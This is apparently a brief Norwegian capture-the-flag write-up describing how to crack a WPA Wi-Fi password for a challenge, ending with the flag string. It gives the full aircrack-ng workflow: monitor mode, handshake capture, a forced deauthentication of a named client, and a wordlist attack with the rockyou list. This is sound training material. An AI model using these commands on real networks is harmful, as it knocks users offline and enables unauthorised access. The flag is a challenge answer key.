# Taskname
> Author: Solli

## Challenge

## Solution

BSSID (MAC til AP):
22:02:71:4E:75:CF

Klien som er koblet til (stemmer ikke med onsite):
26:18:63:E4:4C:02

Statisk channel i bruk:
2

Start network monitoring mode:
```
sudo airmon-ng check kill
sudo airmon-ng start
```

Lytt etter pakker:
```
sudo airodump-ng --bssid 22:02:71:4E:75:CF -w psk wlan0mon -c 2
```

Force re-auth:
```
sudo aireplay-ng --deauth 100 -a 22:02:71:4E:75:CF -c 26:18:63:E4:4C:02 wlan0mon
```

Kan crackes med:
```
aircrack-ng -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -b 22:02:71:4E:75:CF psk-02.cap
```

Kan så stoppe monitor mode:
```
sudo airmon-ng stop
```

UIACTF{especial}